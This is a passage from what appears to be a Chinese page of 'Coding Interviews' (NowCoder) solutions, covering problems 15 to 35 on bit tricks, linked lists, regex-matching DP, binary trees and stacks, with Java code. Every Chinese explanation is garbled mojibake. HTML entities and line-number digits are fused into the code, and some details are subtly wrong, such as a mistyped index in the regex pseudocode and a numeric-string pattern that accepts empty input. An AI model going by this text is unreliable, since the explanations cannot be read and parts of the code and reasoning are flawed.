çš„ä¸ªæ•°ã€‚ è¯¥ä½è¿ç®—æ˜¯å»é™¤ n çš„ä½çº§è¡¨ç¤ºä¸­æœ€ä½çš„é‚£ä¸€ä½ã€‚ 123n : 10110100n-1 : 10110011n&amp;(n-1) : 10110000 12345678public int NumberOf1(int n) &#123; int cnt = 0; while (n != 0) &#123; cnt++; n &amp;= (n - 1); &#125; return cnt;&#125; 16. æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹NowCoder é¢˜ç›®æè¿°ç»™å®šä¸€ä¸ª double ç±»å‹çš„æµ®ç‚¹æ•° base å’Œ int ç±»å‹çš„æ•´æ•° exponentã€‚æ±‚ base çš„ exponent æ¬¡æ–¹ã€‚ è§£é¢˜æ€è·¯ä¸‹é¢çš„è®¨è®ºä¸­ x ä»£è¡¨ baseï¼Œn ä»£è¡¨ exponentã€‚ å› ä¸º (x*x)n/2 å¯ä»¥é€šè¿‡é€’å½’æ±‚è§£ï¼Œå¹¶ä¸”æ¯é€’å½’ä¸€æ¬¡ï¼Œn éƒ½å‡å°ä¸€åŠï¼Œå› æ­¤æ•´ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(logN)ã€‚ 123456789101112131415public double Power(double base, int exponent) &#123; if (exponent == 0) return 1; if (exponent == 1) return base; boolean isNegative = false; if (exponent &lt; 0) &#123; exponent = -exponent; isNegative = true; &#125; double pow = Power(base * base, exponent / 2); if (exponent % 2 != 0) pow = pow * base; return isNegative ? 1 / pow : pow;&#125; 17. æ‰“å°ä» 1 åˆ°æœ€å¤§çš„ n ä½æ•°é¢˜ç›®æè¿°è¾“å…¥æ•°å­— nï¼ŒæŒ‰é¡ºåºæ‰“å°å‡ºä» 1 æœ€å¤§çš„ n ä½åè¿›åˆ¶æ•°ã€‚æ¯”å¦‚è¾“å…¥ 3ï¼Œåˆ™æ‰“å°å‡º 1ã€2ã€3 ä¸€ç›´åˆ°æœ€å¤§çš„ 3 ä½æ•°å³ 999ã€‚ è§£é¢˜æ€è·¯ç”±äº n å¯èƒ½ä¼šéå¸¸å¤§ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥ç”¨ int è¡¨ç¤ºæ•°å­—ï¼Œè€Œæ˜¯ç”¨ char æ•°ç»„è¿›è¡Œå­˜å‚¨ã€‚ ä½¿ç”¨å›æº¯æ³•å¾—åˆ°æ‰€æœ‰çš„æ•°ã€‚ 1234567891011121314151617181920212223242526public void print1ToMaxOfNDigits(int n) &#123; if (n &lt;= 0) return; char[] number = new char[n]; print1ToMaxOfNDigits(number, -1);&#125;private void print1ToMaxOfNDigits(char[] number, int digit) &#123; if (digit == number.length - 1) &#123; printNumber(number); return; &#125; for (int i = 0; i &lt; 10; i++) &#123; number[digit + 1] = (char) (i + '0'); print1ToMaxOfNDigits(number, digit + 1); &#125;&#125;private void printNumber(char[] number) &#123; int index = 0; while (index &lt; number.length &amp;&amp; number[index] == '0') index++; while (index &lt; number.length) System.out.print(number[index++]); System.out.println();&#125; 18.1 åœ¨ O(1) æ—¶é—´å†…åˆ é™¤é“¾è¡¨èŠ‚ç‚¹è§£é¢˜æ€è·¯â‘  å¦‚æœè¯¥èŠ‚ç‚¹ä¸æ˜¯å°¾èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼èµ‹ç»™è¯¥èŠ‚ç‚¹ï¼Œç„¶åä»¤è¯¥èŠ‚ç‚¹æŒ‡å‘ä¸‹ä¸‹ä¸ªèŠ‚ç‚¹ï¼Œå†åˆ é™¤ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚ â‘¡ å¦åˆ™ï¼Œå°±éœ€è¦å…ˆéå†é“¾è¡¨ï¼Œæ‰¾åˆ°èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶åè®©å‰ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘ nullï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚ ç»¼ä¸Šï¼Œå¦‚æœè¿›è¡Œ N æ¬¡æ“ä½œï¼Œé‚£ä¹ˆå¤§çº¦éœ€è¦æ“ä½œèŠ‚ç‚¹çš„æ¬¡æ•°ä¸º N-1+N=2N-1ï¼Œå…¶ä¸­ N-1 è¡¨ç¤º N-1 ä¸ªä¸æ˜¯å°¾èŠ‚ç‚¹çš„æ¯ä¸ªèŠ‚ç‚¹ä»¥ O(1) çš„æ—¶é—´å¤æ‚åº¦æ“ä½œèŠ‚ç‚¹çš„æ€»æ¬¡æ•°ï¼ŒN è¡¨ç¤º 1 ä¸ªå°¾èŠ‚ç‚¹ä»¥ O(N) çš„æ—¶é—´å¤æ‚åº¦æ“ä½œèŠ‚ç‚¹çš„æ€»æ¬¡æ•°ã€‚(2N-1)/N ~ 2ï¼Œå› æ­¤è¯¥ç®—æ³•çš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚ 12345678910111213141516public ListNode deleteNode(ListNode head, ListNode tobeDelete) &#123; if (head == null || head.next == null || tobeDelete == null) return null; if (tobeDelete.next != null) &#123; // è¦åˆ é™¤çš„èŠ‚ç‚¹ä¸æ˜¯å°¾èŠ‚ç‚¹ ListNode next = tobeDelete.next; tobeDelete.val = next.val; tobeDelete.next = next.next; &#125; else &#123; ListNode cur = head; while (cur.next != tobeDelete) cur = cur.next; cur.next = null; &#125; return head;&#125; 18.2 åˆ é™¤é“¾è¡¨ä¸­é‡å¤çš„ç»“ç‚¹NowCoder é¢˜ç›®æè¿° è§£é¢˜æè¿°12345678910111213public ListNode deleteDuplication(ListNode pHead) &#123; if (pHead == null || pHead.next == null) return pHead; ListNode next = pHead.next; if (pHead.val == next.val) &#123; while (next != null &amp;&amp; pHead.val == next.val) next = next.next; return deleteDuplication(next); &#125; else &#123; pHead.next = deleteDuplication(pHead.next); return pHead; &#125;&#125; 19. æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åŒ¹é…åŒ…æ‹¬ â€˜.â€™ å’Œ â€˜*â€˜ çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚æ¨¡å¼ä¸­çš„å­—ç¬¦ â€˜.â€™ è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ â€˜*â€˜ è¡¨ç¤ºå®ƒå‰é¢çš„å­—ç¬¦å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ˆåŒ…å« 0 æ¬¡ï¼‰ã€‚åœ¨æœ¬é¢˜ä¸­ï¼ŒåŒ¹é…æ˜¯æŒ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…æ•´ä¸ªæ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸² â€œaaaâ€ ä¸æ¨¡å¼ â€œa.aâ€ å’Œ â€œab*ac*aâ€ åŒ¹é…ï¼Œä½†æ˜¯ä¸ â€œaa.aâ€ å’Œ â€œab*aâ€ å‡ä¸åŒ¹é…ã€‚ è§£é¢˜æ€è·¯åº”è¯¥æ³¨æ„åˆ°ï¼Œâ€™.â€™ æ˜¯ç”¨æ¥å½“åšä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œè€Œ â€˜*â€˜ æ˜¯ç”¨æ¥é‡å¤å‰é¢çš„å­—ç¬¦ã€‚è¿™ä¸¤ä¸ªçš„ä½œç”¨ä¸åŒï¼Œä¸èƒ½æŠŠ â€˜.â€™ çš„ä½œç”¨å’Œ â€˜*â€˜ è¿›è¡Œç±»æ¯”ï¼Œä»è€ŒæŠŠå®ƒå½“æˆé‡å¤å‰é¢å­—ç¬¦ä¸€æ¬¡ã€‚ 123456789if p.charAt(j) == s.charAt(i) : then dp[i][j] = dp[i-1][j-1];if p.charAt(j) == '.' : then dp[i][j] = dp[i-1][j-1];if p.charAt(j) == '*' : if p.charAt(j-1) != s.charAt(i) : then dp[i][j] = dp[i][j-2] // a* only counts as empty if p.charAt(j-1) == s.charAt(i) or p.charAt(i-1) == '.' : then dp[i][j] = dp[i-1][j] // a* counts as multiple a or dp[i][j] = dp[i][j-1] // a* counts as single a or dp[i][j] = dp[i][j-2] // a* counts as empty 12345678910111213141516171819public boolean match(char[] str, char[] pattern) &#123; int m = str.length, n = pattern.length; boolean[][] dp = new boolean[m + 1][n + 1]; dp[0][0] = true; for (int i = 1; i &lt;= n; i++) if (pattern[i - 1] == '*') dp[0][i] = dp[0][i - 2]; for (int i = 1; i &lt;= m; i++) for (int j = 1; j &lt;= n; j++) if (str[i - 1] == pattern[j - 1] || pattern[j - 1] == '.') dp[i][j] = dp[i - 1][j - 1]; else if (pattern[j - 1] == '*') if (pattern[j - 2] == str[i - 1] || pattern[j - 2] == '.') dp[i][j] = dp[i][j - 1] || dp[i][j - 2] || dp[i - 1][j]; else dp[i][j] = dp[i][j - 2]; return dp[m][n];&#125; 20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦è¡¨ç¤ºæ•°å€¼ï¼ˆåŒ…æ‹¬æ•´æ•°å’Œå°æ•°ï¼‰ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸² â€œ+100â€,â€5e2â€,â€-123â€,â€3.1416â€ å’Œ â€œ-1E-16â€ éƒ½è¡¨ç¤ºæ•°å€¼ã€‚ ä½†æ˜¯ â€œ12eâ€,â€1a3.14â€,â€1.2.3â€,â€+-5â€ å’Œ â€œ12e+4.3â€ éƒ½ä¸æ˜¯ã€‚ è§£é¢˜æ€è·¯12345public boolean isNumeric(char[] str) &#123; if (str == null) return false; return new String(str).matches("[+-]?\\d*(\\.\\d+)?([eE][+-]?\\d+)?");&#125; 21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢NowCoder é¢˜ç›®æè¿°ä¿è¯å¥‡æ•°å’Œå¥‡æ•°ï¼Œå¶æ•°å’Œå¶æ•°ä¹‹é—´çš„ç›¸å¯¹ä½ç½®ä¸å˜ï¼Œè¿™å’Œä¹¦æœ¬ä¸å¤ªä¸€æ ·ã€‚ è§£é¢˜æ€è·¯123456789101112131415public void reOrderArray(int[] nums) &#123; // å¥‡æ•°ä¸ªæ•° int oddCnt = 0; for (int val : nums) if (val % 2 == 1) oddCnt++; int[] copy = nums.clone(); int i = 0, j = oddCnt; for (int num : copy) &#123; if (num % 2 == 1) nums[i++] = num; else nums[j++] = num; &#125;&#125; 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹NowCoder è§£é¢˜æ€è·¯è®¾é“¾è¡¨çš„é•¿åº¦ä¸º Nã€‚è®¾ä¸¤ä¸ªæŒ‡é’ˆ P1 å’Œ P2ï¼Œå…ˆè®© P1 ç§»åŠ¨ K ä¸ªèŠ‚ç‚¹ï¼Œåˆ™è¿˜æœ‰ N - K ä¸ªèŠ‚ç‚¹å¯ä»¥ç§»åŠ¨ã€‚æ­¤æ—¶è®© P1 å’Œ P2 åŒæ—¶ç§»åŠ¨ï¼Œå¯ä»¥çŸ¥é“å½“ P1 ç§»åŠ¨åˆ°é“¾è¡¨ç»“å°¾æ—¶ï¼ŒP2 ç§»åŠ¨åˆ° N - K ä¸ªèŠ‚ç‚¹å¤„ï¼Œè¯¥ä½ç½®å°±æ˜¯å€’æ•°ç¬¬ K ä¸ªèŠ‚ç‚¹ã€‚ 12345678910111213141516public ListNode FindKthToTail(ListNode head, int k)&#123; if (head == null) return null; ListNode P1 = head; while (P1 != null &amp;&amp; k-- &gt; 0) P1 = P1.next; if (k &gt; 0) return null; ListNode P2 = head; while (P1 != null) &#123; P1 = P1.next; P2 = P2.next; &#125; return P2;&#125; 23. é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹NowCoder é¢˜ç›®æè¿°ä¸€ä¸ªé“¾è¡¨ä¸­åŒ…å«ç¯ï¼Œè¯·æ‰¾å‡ºè¯¥é“¾è¡¨çš„ç¯çš„å…¥å£ç»“ç‚¹ã€‚ è¦æ±‚ä¸èƒ½ä½¿ç”¨é¢å¤–çš„ç©ºé—´ã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆ fast æ¯æ¬¡ç§»åŠ¨ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæŒ‡é’ˆ slow æ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ã€‚å› ä¸ºå­˜åœ¨ç¯ï¼Œæ‰€ä»¥ä¸¤ä¸ªæŒ‡é’ˆå¿…å®šç›¸é‡åœ¨ç¯ä¸­çš„æŸä¸ªèŠ‚ç‚¹ä¸Šã€‚å‡è®¾ç›¸é‡ç‚¹åœ¨ä¸‹å›¾çš„ z1 ä½ç½®ï¼Œæ­¤æ—¶ fast ç§»åŠ¨çš„èŠ‚ç‚¹æ•°ä¸º x+2y+zï¼Œslow ä¸º x+yï¼Œç”±äº fast é€Ÿåº¦æ¯” slow å¿«ä¸€å€ï¼Œå› æ­¤ x+2y+z=2(x+y)ï¼Œå¾—åˆ° x=zã€‚ åœ¨ç›¸é‡ç‚¹ï¼Œslow è¦åˆ°ç¯çš„å…¥å£ç‚¹è¿˜éœ€è¦ç§»åŠ¨ z ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœè®© fast é‡æ–°ä»å¤´å¼€å§‹ç§»åŠ¨ï¼Œå¹¶ä¸”é€Ÿåº¦å˜ä¸ºæ¯æ¬¡ç§»åŠ¨ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒåˆ°ç¯å…¥å£ç‚¹è¿˜éœ€è¦ç§»åŠ¨ x ä¸ªèŠ‚ç‚¹ã€‚åœ¨ä¸Šé¢å·²ç»æ¨å¯¼å‡º x=zï¼Œå› æ­¤ fast å’Œ slow å°†åœ¨ç¯å…¥å£ç‚¹ç›¸é‡ã€‚ 12345678910111213141516public ListNode EntryNodeOfLoop(ListNode pHead)&#123; if (pHead == null || pHead.next == null) return null; ListNode slow = pHead, fast = pHead; do &#123; fast = fast.next.next; slow = slow.next; &#125; while (slow != fast); fast = pHead; while (slow != fast) &#123; slow = slow.next; fast = fast.next; &#125; return slow;&#125; 24. åè½¬é“¾è¡¨NowCoder è§£é¢˜æ€è·¯é€’å½’123456789public ListNode ReverseList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode next = head.next; head.next = null; ListNode newHead = ReverseList(next); next.next = head; return newHead;&#125; è¿­ä»£12345678910public ListNode ReverseList(ListNode head) &#123; ListNode newList = new ListNode(-1); while (head != null) &#123; ListNode next = head.next; head.next = newList.next; newList.next = head; head = next; &#125; return newList.next;&#125; 25. åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨NowCoder é¢˜ç›®æè¿° è§£é¢˜æ€è·¯é€’å½’1234567891011121314public ListNode Merge(ListNode list1, ListNode list2)&#123; if (list1 == null) return list2; if (list2 == null) return list1; if (list1.val &lt;= list2.val) &#123; list1.next = Merge(list1.next, list2); return list1; &#125; else &#123; list2.next = Merge(list1, list2.next); return list2; &#125;&#125; è¿­ä»£1234567891011121314151617181920public ListNode Merge(ListNode list1, ListNode list2)&#123; ListNode head = new ListNode(-1); ListNode cur = head; while (list1 != null &amp;&amp; list2 != null) &#123; if (list1.val &lt;= list2.val) &#123; cur.next = list1; list1 = list1.next; &#125; else &#123; cur.next = list2; list2 = list2.next; &#125; cur = cur.next; &#125; if (list1 != null) cur.next = list1; if (list2 != null) cur.next = list2; return head.next;&#125; 26. æ ‘çš„å­ç»“æ„NowCoder é¢˜ç›®æè¿° è§£é¢˜æ€è·¯1234567891011121314151617public boolean HasSubtree(TreeNode root1, TreeNode root2)&#123; if (root1 == null || root2 == null) return false; return isSubtreeWithRoot(root1, root2) || HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2);&#125;private boolean isSubtreeWithRoot(TreeNode root1, TreeNode root2)&#123; if (root2 == null) return true; if (root1 == null) return false; if (root1.val != root2.val) return false; return isSubtreeWithRoot(root1.left, root2.left) &amp;&amp; isSubtreeWithRoot(root1.right, root2.right);&#125; 27. äºŒå‰æ ‘çš„é•œåƒNowCoder é¢˜ç›®æè¿° è§£é¢˜æ€è·¯123456789101112131415public void Mirror(TreeNode root)&#123; if (root == null) return; swap(root); Mirror(root.left); Mirror(root.right);&#125;private void swap(TreeNode root)&#123; TreeNode t = root.left; root.left = root.right; root.right = t;&#125; 28 å¯¹ç§°çš„äºŒå‰æ ‘NowCder é¢˜ç›®æè¿° è§£é¢˜æ€è·¯1234567891011121314151617boolean isSymmetrical(TreeNode pRoot)&#123; if (pRoot == null) return true; return isSymmetrical(pRoot.left, pRoot.right);&#125;boolean isSymmetrical(TreeNode t1, TreeNode t2)&#123; if (t1 == null &amp;&amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetrical(t1.left, t2.right) &amp;&amp; isSymmetrical(t1.right, t2.left);&#125; 29. é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µNowCoder é¢˜ç›®æè¿°ä¸‹å›¾çš„çŸ©é˜µé¡ºæ—¶é’ˆæ‰“å°ç»“æœä¸ºï¼š1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10 è§£é¢˜æ€è·¯12345678910111213141516171819public ArrayList&lt;Integer&gt; printMatrix(int[][] matrix)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); int r1 = 0, r2 = matrix.length - 1, c1 = 0, c2 = matrix[0].length - 1; while (r1 &lt;= r2 &amp;&amp; c1 &lt;= c2) &#123; for (int i = c1; i &lt;= c2; i++) ret.add(matrix[r1][i]); for (int i = r1 + 1; i &lt;= r2; i++) ret.add(matrix[i][c2]); if (r1 != r2) for (int i = c2 - 1; i &gt;= c1; i--) ret.add(matrix[r2][i]); if (c1 != c2) for (int i = r2 - 1; i &gt; r1; i--) ret.add(matrix[i][c1]); r1++; r2--; c1++; c2--; &#125; return ret;&#125; 30. åŒ…å« min å‡½æ•°çš„æ ˆNowCoder é¢˜ç›®æè¿°å®šä¹‰æ ˆçš„æ•°æ®ç»“æ„ï¼Œè¯·åœ¨è¯¥ç±»å‹ä¸­å®ç°ä¸€ä¸ªèƒ½å¤Ÿå¾—åˆ°æ ˆæœ€å°å…ƒç´ çš„ min å‡½æ•°ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021222324private Stack&lt;Integer&gt; dataStack = new Stack&lt;&gt;();private Stack&lt;Integer&gt; minStack = new Stack&lt;&gt;();public void push(int node)&#123; dataStack.push(node); minStack.push(minStack.isEmpty() ? node : Math.min(minStack.peek(), node));&#125;public void pop()&#123; dataStack.pop(); minStack.pop();&#125;public int top()&#123; return dataStack.peek();&#125;public int min()&#123; return minStack.peek();&#125; 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸¤ä¸ªæ•´æ•°åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—è¡¨ç¤ºæ ˆçš„å‹å…¥é¡ºåºï¼Œè¯·åˆ¤æ–­ç¬¬äºŒä¸ªåºåˆ—æ˜¯å¦ä¸ºè¯¥æ ˆçš„å¼¹å‡ºé¡ºåºã€‚å‡è®¾å‹å…¥æ ˆçš„æ‰€æœ‰æ•°å­—å‡ä¸ç›¸ç­‰ã€‚ä¾‹å¦‚åºåˆ— 1,2,3,4,5 æ˜¯æŸæ ˆçš„å‹å…¥é¡ºåºï¼Œåºåˆ— 4,5,3,2,1 æ˜¯è¯¥å‹æ ˆåºåˆ—å¯¹åº”çš„ä¸€ä¸ªå¼¹å‡ºåºåˆ—ï¼Œä½† 4,3,5,1,2 å°±ä¸å¯èƒ½æ˜¯è¯¥å‹æ ˆåºåˆ—çš„å¼¹å‡ºåºåˆ—ã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨ä¸€ä¸ªæ ˆæ¥æ¨¡æ‹Ÿå‹å…¥å¼¹å‡ºæ“ä½œã€‚ 12345678910111213public boolean IsPopOrder(int[] pushSequence, int[] popSequence)&#123; int n = pushSequence.length; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); for (int pushIndex = 0, popIndex = 0; pushIndex &lt; n; pushIndex++) &#123; stack.push(pushSequence[pushIndex]); while (popIndex &lt; n &amp;&amp; stack.peek() == popSequence[popIndex]) &#123; stack.pop(); popIndex++; &#125; &#125; return stack.isEmpty();&#125; 32.1 ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘NowCoder é¢˜ç›®æè¿°ä»ä¸Šå¾€ä¸‹æ‰“å°å‡ºäºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ŒåŒå±‚èŠ‚ç‚¹ä»å·¦è‡³å³æ‰“å°ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹äºŒå‰æ ‘å±‚æ¬¡éå†çš„ç»“æœä¸ºï¼š1,2,3,4,5,6,7 è§£é¢˜æ€è·¯ä½¿ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œå±‚æ¬¡éå†ã€‚ ä¸éœ€è¦ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—åˆ†åˆ«å­˜å‚¨å½“å‰å±‚çš„èŠ‚ç‚¹å’Œä¸‹ä¸€å±‚çš„èŠ‚ç‚¹ï¼Œå› ä¸ºåœ¨å¼€å§‹éå†ä¸€å±‚çš„èŠ‚ç‚¹æ—¶ï¼Œå½“å‰é˜Ÿåˆ—ä¸­çš„èŠ‚ç‚¹æ•°å°±æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹æ•°ï¼Œåªè¦æ§åˆ¶éå†è¿™ä¹ˆå¤šèŠ‚ç‚¹æ•°ï¼Œå°±èƒ½ä¿è¯è¿™æ¬¡éå†çš„éƒ½æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹ã€‚ 123456789101112131415161718public ArrayList&lt;Integer&gt; PrintFromTopToBottom(TreeNode root)&#123; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode t = queue.poll(); if (t == null) continue; ret.add(t.val); queue.add(t.left); queue.add(t.right); &#125; &#125; return ret;&#125; 32.2 æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡ŒNowCoder é¢˜ç›®æè¿°å’Œä¸Šé¢˜å‡ ä¹ä¸€æ ·ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718192021ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(pRoot); while (!queue.isEmpty()) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); &#125; if (list.size() != 0) ret.add(list); &#125; return ret;&#125; 32.3 æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸€ä¸ªå‡½æ•°æŒ‰ç…§ä¹‹å­—å½¢æ‰“å°äºŒå‰æ ‘ï¼Œå³ç¬¬ä¸€è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œç¬¬äºŒå±‚æŒ‰ç…§ä»å³è‡³å·¦çš„é¡ºåºæ‰“å°ï¼Œç¬¬ä¸‰è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œå…¶ä»–è¡Œä»¥æ­¤ç±»æ¨ã€‚ è§£é¢˜æ€è·¯12345678910111213141516171819202122232425public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(pRoot); boolean reverse = false; while (!queue.isEmpty()) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); &#125; if (reverse) Collections.reverse(list); reverse = !reverse; if (list.size() != 0) ret.add(list); &#125; return ret;&#125; 33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œåˆ¤æ–­è¯¥æ•°ç»„æ˜¯ä¸æ˜¯æŸäºŒå‰æœç´¢æ ‘çš„ååºéå†çš„ç»“æœã€‚å‡è®¾è¾“å…¥çš„æ•°ç»„çš„ä»»æ„ä¸¤ä¸ªæ•°å­—éƒ½äº’ä¸ç›¸åŒã€‚ ä¾‹å¦‚ï¼Œä¸‹å›¾æ˜¯ååºéå†åºåˆ— 3,1,2 æ‰€å¯¹åº”çš„äºŒå‰æœç´¢æ ‘ã€‚ è§£é¢˜æ€è·¯1234567891011121314151617181920public boolean VerifySquenceOfBST(int[] sequence)&#123; if (sequence == null || sequence.length == 0) return false; return verify(sequence, 0, sequence.length - 1);&#125;private boolean verify(int[] sequence, int first, int last)&#123; if (last - first &lt;= 1) return true; int rootVal = sequence[last]; int cutIndex = first; while (cutIndex &lt; last &amp;&amp; sequence[cutIndex] &lt;= rootVal) cutIndex++; for (int i = cutIndex + 1; i &lt; last; i++) if (sequence[i] &lt; rootVal) return false; return verify(sequence, first, cutIndex - 1) &amp;&amp; verify(sequence, cutIndex, last - 1);&#125; 34. äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€é¢—äºŒå‰æ ‘å’Œä¸€ä¸ªæ•´æ•°ï¼Œæ‰“å°å‡ºäºŒå‰æ ‘ä¸­ç»“ç‚¹å€¼çš„å’Œä¸ºè¾“å…¥æ•´æ•°çš„æ‰€æœ‰è·¯å¾„ã€‚è·¯å¾„å®šä¹‰ä¸ºä»æ ‘çš„æ ¹ç»“ç‚¹å¼€å§‹å¾€ä¸‹ä¸€ç›´åˆ°å¶ç»“ç‚¹æ‰€ç»è¿‡çš„ç»“ç‚¹å½¢æˆä¸€æ¡è·¯å¾„ã€‚ ä¸‹å›¾çš„äºŒå‰æ ‘æœ‰ä¸¤æ¡å’Œä¸º 22 çš„è·¯å¾„ï¼š10, 5, 7 å’Œ 10, 12 è§£é¢˜æ€è·¯12345678910111213141516171819202122private ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root, int target)&#123; backtracking(root, target, new ArrayList&lt;&gt;()); return ret;&#125;private void backtracking(TreeNode node, int target, ArrayList&lt;Integer&gt; path)&#123; if (node == null) return; path.add(node.val); target -= node.val; if (target == 0 &amp;&amp; node.left == null &amp;&amp; node.right == null) &#123; ret.add(new ArrayList&lt;&gt;(path)); &#125; else &#123; backtracking(node.left, target, path); backtracking(node.right, target, path); &#125; path.remove(path.size() - 1);&#125; 35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªå¤æ‚é“¾è¡¨ï¼ˆæ¯ä¸ªèŠ‚ç‚¹ä¸­æœ‰èŠ‚ç‚¹å€¼ï¼Œä»¥åŠä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦ä¸€ä¸ªç‰¹æ®ŠæŒ‡é’ˆæŒ‡å‘ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ï¼Œè¿”å›ç»“æœä¸ºå¤åˆ¶åå¤æ‚é“¾è¡¨çš„ headã€‚ è§£é¢˜æ€è·¯ç¬¬ä¸€æ­¥ï¼Œåœ¨æ¯ä¸ªèŠ‚ç‚¹çš„åé¢æ’å…¥å¤åˆ¶çš„èŠ‚ç‚¹ã€‚ ç¬¬äºŒæ­¥ï¼Œå¯¹å¤åˆ¶èŠ‚ç‚¹çš„ random é“¾æ¥è¿›è¡Œèµ‹å€¼ã€‚ ç¬¬ä¸‰æ­¥ï¼Œæ‹†åˆ†ã€‚ 123456789101112131415161718192021222324252627282930public RandomListNode Clone(RandomListNode pHead)&#123; if (pHead == null) return null; // æ’å…¥æ–°èŠ‚ç‚¹ RandomListNode cur = pHead; while (cur != null) &#123; RandomListNode clone = new RandomListNode(cur.label); clone.next = cur.next; cur.next = clone; cur = clone.next; &#125; // å»ºç«‹ random é“¾æ¥ cur = pHead; while (cur != null) &#123; RandomListNode clone = cur.next; if (cur.random != null) clone.random = 